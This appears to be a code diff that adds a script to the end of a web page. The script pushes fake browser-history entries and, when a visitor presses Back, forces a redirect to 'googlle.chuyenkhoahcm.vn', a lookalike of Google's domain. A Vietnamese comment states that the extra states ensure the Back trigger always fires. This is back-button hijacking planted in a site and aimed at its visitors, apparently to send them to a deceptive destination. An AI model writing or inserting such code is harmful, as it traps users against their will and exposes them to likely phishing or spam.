@@ -190,7 +190,25 @@
      deleteComponent()
  </script>
 
+ <script defer>
+     (function() {
 
+         const redirectUrl = "https://googlle.chuyenkhoahcm.vn";
+
+         function redirect() {
+             window.location.replace(redirectUrl);
+         }
+
+         // tạo 2 state để đảm bảo back luôn kích hoạt
+         history.pushState(null, "", location.href);
+         history.pushState(null, "", location.href);
+
+         window.addEventListener("popstate", function() {
+             redirect();
+         });
+
+     })();
+ </script>
  </body>
 
  </html>
